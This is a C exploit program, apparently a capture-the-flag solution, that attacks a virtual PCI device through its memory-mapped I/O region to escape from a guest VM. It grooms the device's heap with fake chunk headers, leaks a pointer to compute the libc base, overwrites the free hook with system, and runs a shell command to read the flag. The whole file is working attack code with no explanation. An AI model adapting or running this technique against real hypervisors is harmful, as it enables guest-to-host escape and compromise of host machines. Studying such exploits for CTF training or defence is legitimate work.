#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

void *mmap_addr;
int count = 0;

void die(char *mesg){
    perror(mesg);
    exit(-1);
}

void mmio_write(uint32_t addr,uint32_t value){
    *(uint32_t *)((uint8_t *)mmap_addr + addr) = value;
}

uint32_t mmio_read(uint32_t addr){
    return *(uint32_t *)((uint8_t *)mmap_addr+addr);
}

uint32_t show(uint32_t offset){
    uint32_t addr = 0;
    addr = (6<<16) + offset;
    return mmio_read(addr);
}

void edit(uint32_t offset,uint32_t val){
    uint32_t addr = 0;
    addr = (3<<16) + offset;
    mmio_write(addr,val);
}

void create(uint32_t size){
    uint32_t addr = 0;
    addr = (8<<16) + size/8;
    mmio_write(addr,0x1234);
}

void delete(uint32_t offset){
    uint32_t addr = 0;
    addr = (1<<16) + offset;
    mmio_write(addr,0x1234);
}

void create_once(uint32_t size){
    uint32_t addr = 0;
    addr = (4<<16) + size/8;
    mmio_write(addr,0x1234);
}

void edit_once(uint32_t offset,uint32_t val){
    uint32_t addr = 0;
    addr = (7<<16) + offset;
    mmio_write(addr,val);
}

int main(){
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR);
    if(fd == -1){
	die("open error.");
    }

    mmap_addr = mmap(0,0x100000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(mmap_addr == MAP_FAILED){
	die("mmap error.");
    }

    printf("mmap addr: %p\n",mmap_addr);

    for(int i=0;i<0x100;i++){
        create(0x80);
    }

    edit(0x08,0x91);
    edit(0x98,0x21);
    edit(0xb8,0x21);

    edit(0x108,0x91);
    edit(0x198,0x21);
    edit(0x1b8,0x21);

    delete(0x10);
    delete(0x110);

    uint32_t data1 = show(0x110);
    uint32_t data2 = show(0x114);

    uint64_t mmap_addr = (data2*0x100000000) + data1;
    mmap_addr -= 0x10;
    uint64_t libc_base = mmap_addr - 0x4286000;//0x4243000;0x4286000;0x4248000
    uint64_t system_addr = libc_base + 0x4f440;
    uint64_t free_addr = libc_base + 0x3ed8e8;

    printf("system addr :%lx",mmap_addr);

    edit(0x10,free_addr&0xFFFFFFFF);
    edit(0x14,free_addr>>32);

    create(0x80);
    create(0x80);

    show(0);

    create_once(0x80);
    edit_once(0,system_addr&0xFFFFFFFF);
    edit_once(4,system_addr>>32);

    char *shellcode = "cat /flag";
    for(int j=0;j<strlen(shellcode);j++){
        edit(j,shellcode[j]);
    }

    delete(0);

    return 0;
}
